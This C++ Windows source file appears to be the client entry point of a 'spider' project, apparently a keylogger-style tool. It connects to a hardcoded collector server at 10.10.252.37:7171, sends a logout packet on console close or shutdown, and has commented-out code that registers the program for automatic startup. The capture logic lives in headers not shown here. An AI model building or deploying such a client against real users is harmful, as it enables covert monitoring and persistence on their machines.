// ConsoleApplication1.cpp : définit le point d'entrée pour l'application console.
//
#include <iostream>
#include <Windows.h>

//#include "client/WindowsInputHandler.hpp"
//#include "WindowsLogHandler.hpp"
//#include "AutoStart.hpp"

#include "client/ClientSpider.hpp"

spider::socket::ClientTcpSocket sock("10.10.252.37", 7171);

BOOL CtrlHandler(DWORD fdwCtrlType)
{
	PackageCMDLogOut packet;
	strncpy(packet.cmd, "DEC", 3);

	//if (!sock.startedService())
	//	return FALSE;

	switch (fdwCtrlType)
	{
		// Handle the CTRL-C signal. 
	case CTRL_C_EVENT:
		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
		sock.close();
		return(TRUE);

		// CTRL-CLOSE: confirm that the user wants to exit. 
	case CTRL_CLOSE_EVENT:
		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
		sock.close();
		return(TRUE);

		// Pass other signals to the next handler. 
	case CTRL_BREAK_EVENT:
		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
		sock.close();
		return FALSE;

	case CTRL_LOGOFF_EVENT:
		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
		sock.close();
		return FALSE;

	case CTRL_SHUTDOWN_EVENT:
		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
		sock.close();
		return FALSE;

	default:
		return FALSE;
	}
}

void MessageLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

int main(int ac, char **av)
{
	//spider::AutoStart *tata = new spider::AutoStart();
	//if (tata->isProgramRegistered(L"ConsoleApplication1"))
	//{
	//	//std::cout << "Program is already registered for auto startup." << std::endl;
	//}
	//else
	//{
	//	tata->RegisterProgram();
	//	//std::cout << "Registering program for auto startup..." << std::endl;
	//}

	WSADATA WSAData;
	WSAStartup(MAKEWORD(2, 0), &WSAData);

	sock.setClientID(RANDOM_ID);
	sock.connect();

	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE))
		std::cout << "et merde" << std::endl;

	if (sock.startedService())
	{
		std::cout << "CONNECTED !" << std::endl;
	}
	else
	{
		std::cout << "NOT CONNECTED !" << std::endl;
	}

	spider::ClientSpider sp((LPVOID)av[0]);
	sp.run();

	WSACleanup();
	return 0;
}

